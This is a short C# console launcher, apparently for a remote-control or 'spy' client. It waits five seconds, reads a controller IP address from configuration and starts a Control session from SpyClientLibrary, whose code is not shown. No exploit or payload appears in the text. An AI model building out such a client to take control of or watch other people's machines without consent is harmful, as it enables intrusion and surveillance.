using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SpyClientLibrary;
using System.Threading;
using System.Configuration;

namespace SpyClientConsole
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(5000);
            string ip = ConfigurationManager.AppSettings["IPAdress"];
            Control controlmanager = new Control(ip);
            controlmanager.StartControl();
           
        }
    }
}
